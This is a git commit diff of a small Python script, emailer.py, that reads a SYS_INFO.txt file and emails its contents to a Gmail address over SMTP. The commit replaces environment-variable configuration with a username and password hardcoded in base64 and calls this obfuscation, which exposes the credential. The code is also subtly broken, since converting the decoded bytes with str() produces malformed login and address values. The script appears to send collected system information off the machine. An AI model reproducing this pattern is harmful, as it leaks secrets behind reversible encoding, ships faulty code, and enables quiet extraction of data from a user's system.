6529d57e9f9381dc1e5c33395e7850f0247b13f4
logank <logan.aker1989@gmail.com>
2023-09-21 21:25:59 -0400

    Removed unused imports; added new import (codecs); obfuscated login credentials via base64 encoding.

--- emailer.py
+++ emailer.py
@@ -1,26 +1,22 @@
 import smtplib
-import os
+import codecs
 import logging
-from dotenv import load_dotenv
 from email.message import EmailMessage
 
 logging.basicConfig(filename='winfo.log', filemode='a', level=logging.DEBUG)
 
-load_dotenv()
-USER = os.getenv('USERNAME')
-logging.debug(f'USER = {USER}')
-PASS = os.getenv('PASSWORD')
-logging.debug(f'PASS successfully sourced from .env')
-WINFO = os.getenv('WINFORMATION')
-logging.debug(f'WINFO = {WINFO}')
+USER = b'bG9nYW5rZGV2ZW1haWxAZ21haWwuY29t'
+PASS = b'Z2h3aSB1bHhuIHB6YnIgem56dw=='
+SYS_INFO = 'SYS_INFO.txt'
 
 email = EmailMessage()
-email['from'] = 'WINFORMATION'
-email['to'] = USER
-email['subject'] = 'WINFO'
+email['from'] = 'SYS_INFO'
+email['to'] = codecs.decode(USER, 'base64')
+email['subject'] = 'SYSINFO'
 
 def cast_file_to_message(file):
-   """Read WINFORMATION.txt and cast it as a string into the body of an email."""
+   """Read SYS_INFO.txt and cast it as a string into the body of an email.
+   """
    logging.debug('Casting file to message...')
    with open(file, 'r') as f:
         message = f.read()
@@ -28,16 +24,19 @@ def cast_file_to_message(file):
         return message
 
 def send_mail():
-    """Send email."""
+    """Send email.
+    """
+    decUser = str(codecs.decode(USER, 'base64'))
+    decPass = str(codecs.decode(PASS, 'base64'))
     with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
         smtp.ehlo()
         smtp.starttls()
-        smtp.login(USER, PASS)
+        smtp.login(decUser, decPass)
         smtp.send_message(email)
         logging.debug('Message sent!')
         print('Message sent successfully!')
 
 
 if __name__=="__main__":
-    email.set_content(cast_file_to_message(WINFO))
+    email.set_content(cast_file_to_message(SYS_INFO))
     send_mail()
